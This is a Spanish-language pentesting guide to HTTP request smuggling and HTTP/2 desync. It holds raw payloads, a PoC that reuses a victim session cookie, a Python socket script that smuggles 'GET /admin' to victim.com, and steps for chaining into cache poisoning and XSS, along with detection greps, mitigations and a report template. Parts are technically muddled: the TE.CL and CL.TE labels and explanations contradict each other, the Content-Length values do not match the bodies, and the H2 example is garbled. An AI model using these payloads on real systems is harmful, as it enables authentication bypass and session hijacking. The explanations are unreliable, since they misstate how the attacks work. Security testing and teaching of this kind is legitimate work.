# HTTP Request Smuggling y HTTP/2 Desync

## Resumen

El *HTTP Request Smuggling (HRS)* y la *HTTP/2 Desynchronization (H2 Desync)* son técnicas avanzadas que explotan discrepancias en cómo diferentes componentes (cliente, proxy, servidor) interpretan los límites de las peticiones HTTP. Permiten insertar o modificar peticiones enviadas al servidor backend, esquivar controles de seguridad, cache poisoning, XSS, y obtener acceso a datos de otros usuarios en la misma conexión.

## Contexto

En arquitecturas con múltiples capas de proxy inverso, balanceadores de carga, CDNs y servidores de aplicación, cada componente puede usar parsers o versiones de protocolo distintas (HTTP/1.1 vs HTTP/2 o diferentes librerías). Esto genera discrepancias en la interpretación de cabeceras `Content-Length` y `Transfer-Encoding`, así como en la serialización de flujos HTTP/2, que el atacante puede aprovechar para inyectar peticiones "fantasmas".

## Fundamentos Técnicos

- **Content-Length (CL)**: indica longitud exacta del body en HTTP/1.1.
- **Transfer-Encoding: chunked (TE)**: envía payloads en bloques codificados.
- **HTTP/2 framing**: multiplexación de streams, conversión a HTTP/1.1 en frontales antiguas.
- **CL vs TE discrepancia**: si un proxy prioriza CL y el backend TE, o viceversa, la segunda petición de un conjunto puede interpretarse como inicio de nueva petición ("smuggled").

## Metodología de Ataque

### 1. HRS Básico (TE.CL)

Enviar request con ambas cabeceras para que el proxy y el backend interpreten longitudes distintas:

```http
POST /vulnerable HTTP/1.1
Host: victim.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: victim.com

```

- El proxy usa CL=13 y consume solo el primer bloque, reenviando la línea **`GET /admin`** como nueva petición al backend.

### 2. TE.CL Reverse (CL.TE)

```http
POST /vuln HTTP/1.1
Host: victim.com
Content-Length: 5

0

GET /admin HTTP/1.1
Host: victim.com
Transfer-Encoding: chunked
```

- El proxy usa TE y envía todo al backend; el backend confía en CL y ve un exceso de datos como nueva petición.

### 3. HTTP/2 Desync

Aprovecha la conversión HTTP/2→HTTP/1.1 en frontales antiguas:

1. Enviar múltiples streams en HTTP/2 simulando limit de CL en HTTP/1.1.
2. El frontline arma un solo request HTTP/1.1 con cabeceras inconsistentes.
3. El backend interpreta exceso de datos como nueva petición.

#### Ejemplo H2 Desync

- Stream 1: headers `:method: POST`, `content-length: 20`
- DATA frames suman 20 bytes + additional DATA frame
- TOH backend ve 20 bytes en CL y reinterpreta extra DATA como nueva petición.

## Pruebas Manuales

1. **Detectar vulnerabilidad:** usar payloads de TE.CL y CL.TE con Burp Repeater en modo raw.
2. **Verificar smuggled request:** enviar `GET /admin` embebido y confirmar acceso a ruta administrativa sin sesión.
3. **Probar H2 Desync:** usar cliente HTTP/2 (e.g., h2c, nghttp) y construir custom frames con mismatched CL totales.
4. **Encadenar impactos:** tras smuggling, inyectar cabeceras `Host: attacker.com` para cache poisoning; inyectar payloads XSS en peticiones enmascaradas.

## PoC

```http
# TE.CL payload
POST /login HTTP/1.1
Host: victim.com
Content-Length: 47
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: victim.com
Cookie: session=victim_session
```

- Cliente: Burp Repeater
- 1ª petición: `/login`
- 2ª petición smuggled: `/admin`, accesible sin credenciales desde el backend.

## Automatización

### Smuggler (Burp Extension)

- Instalar **Smuggler** en Burp
- Configurar payload TE.CL y CL.TE
- Ejecutar detección automática de smuggling y resaltar endpoints vulnerables

### Python Script

```python
import socket

def send_smuggle(host, port):
    req = (
        "POST / HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Length: 11\r\n"
        "Transfer-Encoding: chunked\r\n\r\n"
        "0\r\n\r\n"
        "GET /admin HTTP/1.1\r\nHost: %s\r\n\r\n"
    ) % (host, host)
    s = socket.create_connection((host, port))
    s.send(req.encode())
    data = s.recv(4096)
    print(data.decode())
    s.close()

if __name__ == "__main__":
    send_smuggle("victim.com", 80)
```

### H2 Desync Tool

- Usar **h2c** o **nghttp** para enviar múltiples DATA frames más allá del CL declarado
- Monitorear backend logs para verificar peticiones smuggled.

## Explotación / Impacto

- **Bypass de autenticación**: acceso a rutas administrativas sin credenciales.
- **Cache poisoning**: insertar respuestas maliciosas en cache compartida.
- **XSS server-side**: inyectar payloads en respuestas de apps internas.
- **Request hijacking**: robar sesiones de otros usuarios enviados en smuggled requests.

## Detección y Monitoreo

```bash
# Detectar patrones de CL vs TE en logs
grep -E "Transfer-Encoding: chunked" access.log | grep "Content-Length"
# Alertas de peticiones inesperadas a rutas administrativas sin referer
grep "GET /admin" error.log | grep -v "Referer"
```

## Mitigación

1. **Deshabilitar TE/CL combinadas**
   - Proxy: rechazar requests que incluyan ambas cabeceras.
2. **Normalizar y validar longitudes**
   - Asegurar que el proxy y backend usan la misma lógica de parsing.
3. **Actualizar librerías y servidores**
   - Parches (CVE-2024-xxxx) en Varnish, Nginx, Apache.
4. **Habilitar HTTP/2-only**
   - En frontales que soporten H2 nativo, evitar conversión a HTTP/1.1.
5. **WAF Rules**
   - Bloquear TE+CL simultáneos.
   - Inspeccionar mismatches en framing.
6. **Pruebas continuas**
   - Incluir smuggling en pipelines de CI/CD con herramientas automáticas.

## Reporte

**Título:** HTTP Request Smuggling / HTTP/2 Desynchronization – Bypass de Controles y Acceso No Autorizado
**Resumen Ejecutivo:** Vulnerabilidad en el parsing de peticiones permite inyectar peticiones adicionales al backend, eludiendo autenticación, cache y controles de seguridad.
**Pasos de Reproducción:**

1. Enviar payload TE.CL con Burp Repeater.
2. Confirmar smuggled request a `/admin`.
3. Repetir con H2 Desync usando nghttp.
   **Mitigación Recomendada:** Deshabilitar TE+CL combinadas, parchear stacks, alinear parsing, y añadir reglas en WAF para bloquear requests malformados.
